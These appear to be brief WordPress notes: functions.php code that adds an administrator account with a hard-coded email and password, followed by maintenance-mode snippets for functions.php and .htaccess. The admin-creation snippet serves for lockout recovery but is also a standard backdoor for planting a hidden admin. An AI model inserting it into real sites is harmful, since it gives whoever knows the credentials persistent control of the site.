
#### input code in function.php for login
```php
$new_user_email = 'Email@domain.com';
$new_user_password = 'Password';
if(!username_exists($new_user_email)) {
  $user_id = wp_create_user($new_user_email, $new_user_password, $new_user_email);
  wp_update_user(array('ID' => $user_id, 'nickname' => $new_user_email));
  $user = new WP_User($user_id);
  $user->set_role('administrator');
}
```

### input code in function.php
```php
// Activate WordPress Maintenance Mode
function wp_maintenance_mode() {
    if (!current_user_can('edit_themes') || !is_user_logged_in()) {
        wp_die('<h1>Under Maintenance</h1><br />Something ain't right, but we're working on it! Check back later.');
    }
}
add_action('get_header', 'wp_maintenance_mode');
```
OR
### input code in .httacess
```php
RewriteEngine On
RewriteBase /
RewriteCond %{REMOTE_ADDR} !^123\.456\.789\.123
RewriteCond %{REQUEST_URI} !^/maintenance\.html$
RewriteRule ^(.*)$ https://example.com/maintenance.html [R=307,L]
```
